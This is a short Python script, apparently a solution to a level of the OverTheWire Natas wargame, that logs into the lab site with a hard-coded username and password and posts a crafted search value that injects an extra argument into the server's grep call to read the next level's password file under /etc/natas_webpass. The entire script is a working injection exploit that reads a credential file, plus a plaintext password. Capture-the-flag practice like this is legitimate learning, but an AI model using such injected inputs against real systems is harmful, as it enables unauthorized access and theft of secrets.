import requests


user_name = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"

url = f"http://{user_name}.natas.labs.overthewire.org"

session = requests.Session()

inject = ". /etc/natas_webpass/natas11 #"
#response = session.get(url, auth = (user_name, password))
response = session.post(url, data= {"needle" : inject, "submit" : "submit"}, auth =  (user_name, password))

content = response.text

print(content)